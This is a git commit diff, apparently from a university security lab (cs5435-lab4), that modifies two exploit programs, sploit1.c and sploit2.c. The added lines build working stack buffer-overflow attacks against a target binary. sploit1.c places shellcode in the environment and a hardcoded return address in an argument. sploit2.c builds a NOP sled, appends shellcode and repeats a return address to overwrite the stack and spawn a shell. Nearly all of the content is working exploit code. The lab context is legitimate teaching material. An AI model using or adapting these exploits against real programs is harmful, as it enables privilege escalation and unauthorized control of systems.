ce39bce07ef39004acb6139f71bc49de1437f77c
jameszhang18 <zgc19970116>
2019-12-05 11:26:10 -0500

    s

--- cs5435-lab4/sploits/sploit1.c
+++ cs5435-lab4/sploits/sploit1.c
@@ -10,13 +10,16 @@
 int main(void)
 {
   char *args[3]; 
-  char *env[1];
+  char *env[2];
   
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = "\x90\x90\x90\x90\x96\x87\xb2\xbf\xb9\xff\xff\xbf"; 
   args[2] = NULL;
   
-  env[0] = NULL;
+  env[0] = shellcodeAlephOne;
+  env[1] = NULL;
+  
+  
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
--- cs5435-lab4/sploits/sploit2.c
+++ cs5435-lab4/sploits/sploit2.c
@@ -9,12 +9,28 @@
 
 int main(void)
 {
-  char *args[3]; 
+  char *args[4]; 
   char *env[1];
   
   args[0] = TARGET;
-  args[1] = "student"; 
-  args[2] = NULL;
+  args[1] = "";
+
+  char str[408];
+  memset(str, 0, 408);
+  strcpy(str, "\x90\x90\x90");
+  for (int i = 0; i < 200; ++i)
+  {
+  	strcat(str, "\x90");
+  }
+  strcat(str, shellcodeAlephOne);
+  for (int i = 0; i < 38; ++i)
+  {
+  	strcat(str, "\x20\xfb\xff\xbf");
+  }
+  args[1] = str;
+
+  args[2] = "65935";
+  args[3] = NULL;
   
   env[0] = NULL;
   execve(TARGET, args, env);
